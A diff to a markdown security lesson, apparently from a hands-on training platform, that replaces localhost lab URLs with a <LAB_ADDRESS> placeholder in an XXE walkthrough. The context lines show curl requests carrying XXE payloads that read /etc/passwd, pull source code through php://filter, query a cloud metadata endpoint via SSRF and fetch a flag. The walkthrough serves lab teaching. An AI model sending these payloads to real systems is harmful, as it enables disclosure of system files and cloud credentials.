@@ -61,7 +61,10 @@ echo (string)$data->name;
 ```bash
 cd xxe/lab
 docker compose up -d
-# Lab at: http://localhost:7109
+
+> 💡 **Get Lab Link:** Open this lesson on **Learning Detail** → click **"Access Lab"** to get the real link (e.g., `https://vuln.ghedahaui.online/labs-env/...`). Replace `<LAB_ADDRESS>` with that link in commands below.
+
+# Lab at: <LAB_ADDRESS>
 ```
 
 The lab is an API that accepts XML (like a "product" or "search" app) via `POST /api/parse`, parses it and returns the `name` field.
@@ -71,7 +74,7 @@ The lab is an API that accepts XML (like a "product" or "search" app) via `POST 
 ### Step 2: Send normal XML
 
 ```bash
-$ curl -s http://localhost:7109/api/parse -X POST \
+$ curl -s <LAB_ADDRESS>/api/parse -X POST \
        -H "Content-Type: application/xml" \
        -d '<product><name>Laptop</name><price>999</price></product>'
 {"name":"Laptop"}
@@ -84,7 +87,7 @@ $ curl -s http://localhost:7109/api/parse -X POST \
 ### Step 3: XXE read /etc/passwd
 
 ```bash
-$ curl -s http://localhost:7109/api/parse -X POST \
+$ curl -s <LAB_ADDRESS>/api/parse -X POST \
        -H "Content-Type: application/xml" \
        -d '<?xml version="1.0"?>
            <!DOCTYPE product [
@@ -103,7 +106,7 @@ daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 ### Step 4: Read a file with special chars (php://filter)
 
 ```bash
-$ curl -s http://localhost:7109/api/parse -X POST \
+$ curl -s <LAB_ADDRESS>/api/parse -X POST \
        -H "Content-Type: application/xml" \
        -d '<?xml version="1.0"?>
            <!DOCTYPE product [
@@ -124,7 +127,7 @@ $ echo "PD9waHAgLy8gQVBJIHBhcnNl..." | base64 -d
 ### Step 5: SSRF — call the cloud metadata endpoint
 
 ```bash
-$ curl -s http://localhost:7109/api/parse -X POST \
+$ curl -s <LAB_ADDRESS>/api/parse -X POST \
        -H "Content-Type: application/xml" \
        -d '<?xml version="1.0"?>
            <!DOCTYPE product [
@@ -141,7 +144,7 @@ $ curl -s http://localhost:7109/api/parse -X POST \
 ### Step 6: Read the flag via XXE
 
 ```bash
-$ curl -s http://localhost:7109/api/parse -X POST \
+$ curl -s <LAB_ADDRESS>/api/parse -X POST \
        -H "Content-Type: application/xml" \
        -d '<?xml version="1.0"?>
            <!DOCTYPE product [
